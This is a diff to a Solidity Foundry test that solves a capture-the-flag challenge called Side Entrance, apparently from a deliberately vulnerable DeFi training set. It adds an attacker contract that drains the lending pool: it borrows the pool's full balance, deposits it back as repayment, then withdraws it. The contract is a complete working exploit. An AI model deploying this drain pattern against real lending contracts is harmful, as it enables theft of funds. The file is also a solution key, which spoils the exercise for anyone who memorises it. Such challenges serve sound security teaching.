@@ -3,7 +3,29 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+
+contract SideEntranceAttacker is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool private immutable pool;
+    address private immutable recovery;
+
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        payable(recovery).transfer(address(this).balance);
+    }
+
+    function execute() external payable override {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +67,8 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        SideEntranceAttacker attacker = new SideEntranceAttacker(pool, recovery);
+        attacker.attack();
     }
 
     /**
